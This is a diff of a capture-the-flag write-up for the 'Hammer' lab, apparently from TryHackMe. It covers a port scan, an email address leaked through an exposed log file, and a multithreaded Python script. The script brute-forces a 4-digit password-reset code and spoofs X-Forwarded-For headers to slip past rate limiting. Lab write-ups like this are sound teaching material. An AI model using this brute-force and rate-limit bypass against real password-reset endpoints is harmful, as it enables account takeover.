@@ -38,12 +38,11 @@ PORT     STATE SERVICE VERSION
 |_      httponly flag not set
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ``` 
-Found two open ports:
-1. 22 -> ssh
-2. 1337 -> http
-
+Found two open ports
+1) 22 -> ssh
+2) 1337 -> http
 `http://10.10.49.135:1337/`, we get a login form.
-Testing the form with default credentials, we get the message: `Invalid email address!`
+Testing the form with default credentials, we get the message: `Invalid Email or Password!`
 <img src="/assets/img/hammer/1.png">
 ok, let me look at the src code 
 <img src="/assets/img/hammer/2.png">
@@ -66,7 +65,6 @@ found `hmr_logs` has `error.logs` file let's open it
 <img src="/assets/img/hammer/3.png">
 
 we discover an email address: `tester@hammer.thm`
-
 # Bypassing the Rate Limit
 ---
 Now that we discovered a valid email address, we can try to reset the password for the user at `http://10.10.63.156:1337/reset_password.php`
@@ -99,17 +97,13 @@ import random
 import threading
 # Target URL
 url = "http://10.10.49.135:1337/reset_password.php"
-
 # Event flag to stop threads when the correct code is found
 stop_flag = threading.Event()
-
 # Number of threads to use
 num_threads = 50
-
 # Generate a random 'X-Forwarded-For' header in the form '127.0.$.$'
 def random_ip():
     return f"127.0.{random.randint(0, 255)}.{random.randint(0, 255)}"
-
 # Brute-force function executed by each thread
 def brute_force_code(session, start, end):
     for code in range(start, end):
@@ -124,13 +118,11 @@ def brute_force_code(session, start, end):
             
             if stop_flag.is_set():
                 return  # Stop if the flag is set by another thread
-            
             # Check if we hit a rate limit (status code 302 in this case)
             if response.status_code == 302:
                 stop_flag.set()  # Stop all threads
                 print("[-] Timeout reached. Try again.")
                 return
-            
             # Check for a successful recovery code (modify based on server's response)
             if "Invalid or expired recovery code!" not in response.text:
                 stop_flag.set()
@@ -141,21 +133,17 @@ def brute_force_code(session, start, end):
 
         except Exception as e:
             pass  # Ignore exceptions for now
-
 # Main function to handle multithreading and start the brute-force process
 def main():
     session = requests.Session()
-
     # Sending the password reset request
     print("[+] Sending the password reset request.")
     session.post(url, data={"email": "tester@hammer.thm"})
-
     # Brute-forcing the recovery code
     print("[+] Starting the code brute-force.")
     code_range = 10000  # Range of 4-digit codes (0000-9999)
     step = code_range // num_threads
     threads = []
-
     # Create and start threads
     for i in range(num_threads):
         start = i * step
@@ -163,7 +151,6 @@ def main():
         thread = threading.Thread(target=brute_force_code, args=(session, start, end))
         threads.append(thread)
         thread.start()
-
     # Wait for all threads to finish
     for thread in threads:
         thread.join()
